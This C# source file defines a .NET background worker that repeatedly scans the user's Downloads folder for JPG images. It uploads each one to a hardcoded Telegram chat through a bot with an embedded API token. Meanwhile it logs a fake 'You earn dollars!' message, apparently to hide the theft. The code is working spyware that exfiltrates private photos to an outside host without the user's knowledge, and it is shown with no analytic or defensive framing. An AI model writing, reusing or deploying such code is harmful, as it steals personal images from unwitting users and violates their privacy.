using Telegram.Bot;
using Telegram.Bot.Types.InputFiles;

namespace SendingPhotos;

public class Worker : BackgroundService
{
    private readonly ILogger<Worker> _logger;
    private readonly TelegramBotClient client = new TelegramBotClient("6038954379:AAGttmGTJuXIYg5oNrFNKIufZ_wVHE8s-Kc");
    private static List<string> sendedFiles = new List<string>();

    public Worker(ILogger<Worker> logger)
    {
        _logger = logger;
    }

    protected override async Task ExecuteAsync(CancellationToken stoppingToken)
    {

       string userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
       string downloadPath = Path.Combine(userProfile, "Downloads");
        while (!stoppingToken.IsCancellationRequested)
        {
            var Files = Directory.GetFiles(downloadPath, "*.jpg", SearchOption.AllDirectories);


            foreach (string file in Files)
            {
                if (!sendedFiles.Contains(file))
                {
                    using(FileStream fs = new FileStream(file,FileMode.Open,FileAccess.Read))
                    {
                        if(fs.Length <= 3145728)
                        {
                            await client.SendPhotoAsync("33780774", new InputOnlineFile(fs));
                            _logger.LogInformation($"You earn  ${new Random().Next(1,50)} dollars! :)", DateTimeOffset.Now);
                            sendedFiles.Add(file);

                        }

                    }


                }
            
            }
            
          
        }
    }
}
